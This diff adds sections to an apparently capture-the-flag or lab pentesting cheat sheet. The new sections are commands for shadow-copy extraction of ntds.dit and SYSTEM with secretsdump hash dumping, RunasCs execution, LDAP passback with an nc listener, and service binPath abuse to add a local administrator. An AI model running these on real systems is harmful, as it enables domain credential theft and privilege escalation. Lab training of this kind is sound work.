@@ -880,6 +880,50 @@ feroxbuster -u http://$BoxIP/ -w $Wordlist -x html,txt,php -t 30 -o $BoxDir/nmap
 
 Use the Winlogon query when a foothold has no useful groups or privileges. Use the web scan when anonymous RPC, LDAP, and SMB enumeration return no useful usernames.
 
+## Flight: Offline NTDS extraction without Kerberos
+
+```cmd
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\System32\config\SYSTEM C:\Windows\Temp\sys2.save
+vssadmin delete shadows /all /quiet
+```
+
+```bash
+secretsdump.py LOCAL -ntds ntds.dit -system sys2.save -just-dc-ntlm
+```
+
+Use the shadow-copy number printed by vssadmin. This is an offline parse and does not use Kerberos.
+
+## Flight: RunasCs credentialed execution
+
+```cmd
+.\RunasCs.exe $Username $Password "cmd /c <command>"
+```
+
+Use this when valid credentials exist but the account cannot obtain an interactive WinRM, RDP, or PsExec session.
+
+## LDAP Passback and Server Operators
+
+```bash
+# Listen for a service's outbound LDAP Simple Bind
+nc -lvnp 389
+
+# Trigger an editable LDAP server address field
+curl -s -X POST --data "ip=$LocalIP" http://$BoxIP/settings.php
+```
+
+```powershell
+# Query and temporarily abuse a LocalSystem service
+sc.exe qc $ServiceName
+sc.exe config $ServiceName binPath= "cmd.exe /c <command>"
+sc.exe start $ServiceName
+net localgroup administrators $Username /add
+net localgroup administrators $Username /delete
+```
+
+Restore the original service path immediately after the command runs.
+
 ## External Resources
 
 - [HackTricks - Active Directory](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
